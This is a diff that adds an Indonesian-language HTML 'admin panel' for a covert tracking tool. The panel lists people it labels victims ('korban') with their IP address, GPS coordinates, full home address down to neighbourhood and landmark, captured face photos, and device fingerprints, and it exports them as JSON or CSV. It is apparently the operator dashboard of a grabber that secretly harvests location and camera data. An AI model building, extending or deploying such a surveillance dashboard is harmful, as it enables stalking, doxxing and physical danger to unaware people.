@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZYX - Panel Admin</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            padding: 12px;
+            min-height: 100vh;
+        }
+        h1 {
+            text-align: center;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+            margin-bottom: 12px;
+            font-size: 20px;
+            letter-spacing: 3px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+        .stat {
+            background: #111;
+            padding: 8px;
+            border: 1px solid #00ff4133;
+            border-radius: 4px;
+            text-align: center;
+        }
+        .stat .num {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00ff41;
+        }
+        .stat .label {
+            font-size: 9px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .controls {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+        .btn {
+            padding: 6px 14px;
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #00ff41;
+            color: #000;
+        }
+        .btn-danger {
+            border-color: #ff3b3b;
+            color: #ff3b3b;
+        }
+        .btn-danger:hover {
+            background: #ff3b3b;
+            color: #000;
+        }
+        .btn-warning {
+            border-color: #ffaa00;
+            color: #ffaa00;
+        }
+        .btn-warning:hover {
+            background: #ffaa00;
+            color: #000;
+        }
+
+        .entry {
+            background: #111;
+            border: 1px solid #00ff4122;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 8px;
+        }
+        .entry .head {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 4px;
+            font-size: 12px;
+        }
+        .entry .head .ip {
+            color: #ffaa00;
+            font-weight: bold;
+        }
+        .entry .head .time {
+            color: #666;
+            font-size: 10px;
+        }
+        .entry .detail {
+            font-size: 11px;
+            color: #b0ffb0;
+            margin-top: 4px;
+            line-height: 1.7;
+        }
+        .entry .detail span {
+            color: #666;
+        }
+        .entry .detail .rt-info {
+            color: #ffd54f;
+            font-weight: bold;
+        }
+        .entry .detail .landmark-info {
+            color: #ffaa00;
+        }
+        .face-section {
+            margin-top: 6px;
+            padding: 6px;
+            background: #0d0d0d;
+            border: 1px solid #ff3b3b44;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            cursor: pointer;
+        }
+        .face-section:hover {
+            border-color: #ff3b3b88;
+        }
+        .face-section img {
+            max-width: 70px;
+            max-height: 70px;
+            border-radius: 4px;
+            border: 1px solid #ff3b3b66;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .face-section img:hover {
+            transform: scale(1.05);
+            border-color: #ff3b3b;
+        }
+        .face-section .info {
+            font-size: 10px;
+            color: #ff8888;
+        }
+        .badge {
+            display: inline-block;
+            padding: 1px 8px;
+            border-radius: 12px;
+            font-size: 9px;
+            font-weight: bold;
+            margin-left: 3px;
+        }
+        .badge.mobile {
+            background: #1a3a1a;
+            color: #00ff41;
+            border: 1px solid #00ff4144;
+        }
+        .badge.desktop {
+            background: #1a1a3a;
+            color: #4488ff;
+            border: 1px solid #4488ff44;
+        }
+        .badge.gps {
+            background: #1a1a3a;
+            color: #00ccff;
+            border: 1px solid #00ccff44;
+        }
+        .badge.face {
+            background: #3a1a1a;
+            color: #ff3b3b;
+            border: 1px solid #ff3b3b44;
+        }
+        .badge.rt {
+            background: #1a3a2a;
+            color: #ffd54f;
+            border: 1px solid #ffd54f44;
+        }
+        .badge.landmark {
+            background: #2a2a1a;
+            color: #ffaa00;
+            border: 1px solid #ffaa0044;
+        }
+        .map-link {
+            color: #4488ff;
+            text-decoration: none;
+        }
+        .map-link:hover {
+            text-decoration: underline;
+        }
+        .location-box {
+            background: #0d0d0d;
+            padding: 2px 8px;
+            border-radius: 4px;
+            display: inline-block;
+            font-size: 11px;
+            border: 1px solid #00ff4111;
+        }
+        .empty {
+            color: #555;
+            text-align: center;
+            padding: 20px;
+        }
+        .gps-coord {
+            color: #00ccff;
+            font-size: 11px;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(12px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #111;
+            border-radius: 16px;
+            max-width: 600px;
+            width: 100%;
+            padding: 25px;
+            border: 1px solid #00ff4133;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal-box img {
+            width: 100%;
+            border-radius: 8px;
+            border: 2px solid #2a4a2a;
+        }
+        .modal-box .close-btn {
+            text-align: center;
+            margin-top: 14px;
+            color: #666;
+            font-size: 12px;
+            cursor: pointer;
+            letter-spacing: 2px;
+            padding: 8px;
+            border: 1px solid #222;
+            border-radius: 8px;
+            transition: 0.2s;
+        }
+        .modal-box .close-btn:hover {
+            background: #1a1a1a;
+            color: #00ff41;
+        }
+        .modal-box .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 12px;
+        }
+        .modal-box .detail-row .label {
+            color: #666;
+        }
+        .modal-box .detail-row .value {
+            color: #b0ffb0;
+        }
+        .modal-box .detail-row .value.rt {
+            color: #ffd54f;
+            font-weight: bold;
+        }
+        .modal-box .detail-row .value.landmark {
+            color: #ffaa00;
+        }
+    </style>
+</head>
+<body>
+    <h1>🕵️ ZYX · PANEL ADMIN</h1>
+
+    <div class="stats" id="stats"></div>
+
+    <div class="controls">
+        <button class="btn" onclick="refreshData()">🔄 Refresh</button>
+        <button class="btn btn-danger" onclick="clearAll()">🗑️ Hapus</button>
+        <button class="btn btn-warning" onclick="exportData()">📥 Export JSON</button>
+        <button class="btn" onclick="exportCSV()">📊 Export CSV</button>
+    </div>
+
+    <div id="dataContainer"></div>
+
+    <div class="modal-overlay" id="faceZoomModal">
+        <div class="modal-box">
+            <h3 style="color:#00ff41;font-weight:300;letter-spacing:2px;margin-bottom:10px;">📸 Detail Korban</h3>
+            <img id="zoomFaceImg" src="" alt="Face">
+            <div id="zoomDetail" style="margin-top:12px;"></div>
+            <div class="close-btn" onclick="closeZoomModal()">✕ TUTUP</div>
+        </div>
+    </div>
+
+    <script>
+        function getData() {
+            try { return JSON.parse(localStorage.getItem('zyx_ultimate_v5') || '[]'); } catch { return []; }
+        }
+
+        function renderStats(data) {
+            const total = data.length;
+            const today = new Date().toDateString();
+            const todayCount = data.filter(d => new Date(d.timestamp).toDateString() === today).length;
+            const uniqueIps = new Set(data.map(d => d.ip).filter(Boolean)).size;
+            const withFace = data.filter(d => d.faceDetected === true).length;
+            const withGps = data.filter(d => d.gpsLat).length;
+            const withRt = data.filter(d => d.rt && d.rw).length;
+            const withLandmark = data.filter(d => d.landmark).length;
+
+            document.getElementById('stats').innerHTML = `
+                <div class="stat"><div class="num">${total}</div><div class="label">Total</div></div>
+                <div class="stat"><div class="num">${todayCount}</div><div class="label">Hari Ini</div></div>
+                <div class="stat"><div class="num">${uniqueIps}</div><div class="label">IP Unik</div></div>
+                <div class="stat"><div class="num">${withFace}</div><div class="label">Wajah</div></div>
+                <div class="stat"><div class="num">${withGps}</div><div class="label">GPS</div></div>
+                <div class="stat"><div class="num">${withRt}</div><div class="label">RT/RW</div></div>
+                <div class="stat"><div class="num">${withLandmark}</div><div class="label">Patokan</div></div>
+            `;
+        }
+
+        function renderData() {
+            const data = getData();
+            const container = document.getElementById('dataContainer');
+            renderStats(data);
+
+            if (data.length === 0) {
+                container.innerHTML = '<div class="empty">Belum ada data.</div>';
+                return;
+            }
+
+            let html = '';
+            const reversed = [...data].reverse();
+            reversed.forEach((d, idx) => {
+                const deviceClass = d.deviceType === 'mobile' ? 'mobile' : d.deviceType === 'tablet' ? 'tablet' :
+                'desktop';
+                const locParts = [];
+                if (d.country) locParts.push(d.country);
+                if (d.region && d.region !== d.country) locParts.push(d.region);
+                if (d.city) locParts.push(d.city);
+                if (d.district) locParts.push(d.district);
+                if (d.village) locParts.push(d.village);
+                const location = locParts.join(' › ') || 'Tidak diketahui';
+
+                const hasGps = d.gpsLat && d.gpsLon;
+                const hasFace = d.faceDetected && d.faceImage;
+                const hasRt = d.rt && d.rw;
+                const hasLandmark = d.landmark;
+
+                let addressParts = [];
+                if (d.houseNumber) addressParts.push('No.' + d.houseNumber);
+                if (d.street) addressParts.push(d.street);
+                if (d.village) addressParts.push(d.village);
+                if (d.district) addressParts.push(d.district);
+                if (d.city) addressParts.push(d.city);
+                if (d.region) addressParts.push(d.region);
+                const fullAddr = addressParts.join(', ') || '-';
+
+                html += `
+                <div class="entry">
+                    <div class="head">
+                        <div>
+                            <span class="ip">📍 ${d.ip || 'IP tidak terdeteksi'}</span>
+                            <span class="badge ${deviceClass}">${d.deviceType || 'unknown'}</span>
+                            ${hasGps ? '<span class="badge gps">📍 GPS</span>' : ''}
+                            ${hasFace ? '<span class="badge face">📸 WAJAH</span>' : ''}
+                            ${hasRt ? '<span class="badge rt">🏘️ RT/RW</span>' : ''}
+                            ${hasLandmark ? '<span class="badge landmark">📍 PATOKAN</span>' : ''}
+                            <span class="location-box">${location}</span>
+                        </div>
+                        <div class="time">${d.timestamp_local || new Date(d.timestamp).toLocaleString()}</div>
+                    </div>
+
+                    <div class="detail">
+                        ${d.country ? `<span>🌍</span> ${d.country} ${d.countryCode ? `(${d.countryCode})` : ''}` : ''}
+                        ${d.city ? ` · 🏙️ ${d.city}` : ''}
+                        ${d.district ? ` · 🏘️ ${d.district}` : ''}
+                        ${d.zip ? ` · 📮 ${d.zip}` : ''}
+                        ${d.isp ? ` · 🔌 ${d.isp}` : ''}
+                        <br>
+
+                        <span>🏠 Alamat:</span> ${fullAddr}
+                        ${hasRt ? ` · <span class="rt-info">RT ${d.rt} / RW ${d.rw}</span>` : ''}
+                        <br>
+
+                        ${hasLandmark ? `<span class="landmark-info">📍 Patokan: ${d.landmark}</span><br>` : ''}
+
+                        ${hasGps ? `
+                            <span class="gps-coord">🛰️ GPS: ${d.gpsLat.toFixed(6)}, ${d.gpsLon.toFixed(6)}</span>
+                            ${d.gpsAccuracy ? ` · Akurasi: ${Math.round(d.gpsAccuracy)}m` : ''}
+                            <a class="map-link" href="https://maps.google.com/maps?q=${d.gpsLat},${d.gpsLon}" target="_blank"> 🗺️ Lihat GPS</a>
+                            <br>
+                        ` : (d.lat && d.lon ? `
+                            <span class="gps-coord">📍 IP: ${d.lat.toFixed(4)}, ${d.lon.toFixed(4)}</span>
+                            <a class="map-link" href="https://maps.google.com/maps?q=${d.lat},${d.lon}" target="_blank"> 🗺️ Lihat Peta</a>
+                            <br>
+                        ` : '')}
+
+                        ${d.os ? `💻 ${d.os}` : ''}
+                        ${d.browser ? ` · 🌐 ${d.browser}` : ''}
+                        ${d.screen ? ` · 🖥️ ${d.screen}` : ''}
+                        <br>
+
+                        ${d.connectionType ? `📶 ${d.connectionType} · ${d.connectionSpeed || '?'}Mbps` : ''}
+                        ${d.timezone ? ` · 🕐 ${d.timezone}` : ''}
+                        ${d.language ? ` · 🌐 ${d.language}` : ''}
+                        <br>
+
+                        ${d.webglRenderer ? `<span style="color:#555;font-size:10px;">🎮 GPU: ${d.webglRenderer}</span>` : ''}
+                        ${d.localIp ? ` · <span style="color:#555;font-size:10px;">🏠 IP Lokal: ${d.localIp}</span>` : ''}
+                    </div>
+
+                    ${hasFace ? `
+                    <div class="face-section" onclick="openZoomModal('${d.faceImage}', '${fullAddr}', '${d.rtRw || '-'}', '${d.landmark || '-'}', '${d.ip || '-'}', '${d.os || '-'}', '${d.browser || '-'}', '${d.deviceType || '-'}', '${d.gpsLat && d.gpsLon ? d.gpsLat.toFixed(6)+', '+d.gpsLon.toFixed(6) : d.lat && d.lon ? d.lat.toFixed(4)+', '+d.lon.toFixed(4) : '-'}')">
+                        <img src="${d.faceImage}" alt="Face">
+                        <div class="info">
+                            <strong>📸 WAJAH TEREKAM</strong><br>
+                            Skin: ${d.faceData?.skinRatio || '?'}<br>
+                            <span style="color:#666;font-size:9px;">Klik untuk zoom</span>
+                        </div>
+                    </div>
+                    ` : `
+                    <div style="color:#444;font-size:10px;margin-top:4px;">🚫 Tidak ada wajah terekam</div>
+                    `}
+
+                    <div style="font-size:9px;color:#333;margin-top:4px;word-break:break-all;">
+                        ${d.userAgent ? d.userAgent.substring(0, 100) + '...' : ''}
+                    </div>
+                </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function openZoomModal(faceImg, address, rtRw, landmark, ip, os, browser, device, coord) {
+            document.getElementById('zoomFaceImg').src = faceImg;
+            document.getElementById('zoomDetail').innerHTML = `
+                <div class="detail-row"><span class="label">🏠 Alamat</span><span class="value">${address || '-'}</span></div>
+                <div class="detail-row"><span class="label">📌 RT/RW</span><span class="value rt">${rtRw || '-'}</span></div>
+                <div class="detail-row"><span class="label">📍 Patokan</span><span class="value landmark">${landmark || '-'}</span></div>
+                <div class="detail-row"><span class="label">🌍 Koordinat</span><span class="value">${coord || '-'}</span></div>
+                <div class="detail-row"><span class="label">📱 Perangkat</span><span class="value">${device || '-'} · ${os || '-'} · ${browser || '-'}</span></div>
+                <div class="detail-row"><span class="label">🌐 IP</span><span class="value">${ip || '-'}</span></div>
+            `;
+            document.getElementById('faceZoomModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeZoomModal() {
+            document.getElementById('faceZoomModal').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        document.getElementById('faceZoomModal').addEventListener('click', function(e) {
+            if (e.target === this) closeZoomModal();
+        });
+
+        function refreshData() { renderData(); }
+
+        function clearAll() {
+            if (confirm('⚠️ Hapus SEMUA data?')) {
+                localStorage.removeItem('zyx_ultimate_v5');
+                renderData();
+            }
+        }
+
+        function exportData() {
+            const data = getData();
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `zyx_v5_${new Date().toISOString().slice(0,10)}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function exportCSV() {
+            const data = getData();
+            if (data.length === 0) return alert('Tidak ada data');
+            const headers = ['timestamp', 'ip', 'country', 'city', 'district', 'village', 'street', 'houseNumber', 'rt',
+                'rw', 'landmark', 'address', 'lat', 'lon', 'gpsLat', 'gpsLon', 'deviceType', 'os', 'browser',
+                'faceDetected', 'isp'
+            ];
+            let csv = headers.join(',') + '\n';
+            data.forEach(d => {
+                const row = headers.map(h => {
+                    let val = d[h] ?? '';
+                    if (typeof val === 'string' && val.includes(',')) val = `"${val}"`;
+                    if (typeof val === 'boolean') val = val ? 'true' : 'false';
+                    return val;
+                });
+                csv += row.join(',') + '\n';
+            });
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `zyx_v5_${new Date().toISOString().slice(0,10)}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        setInterval(renderData, 8000);
+        renderData();
+    </script>
+</body>
+</html>
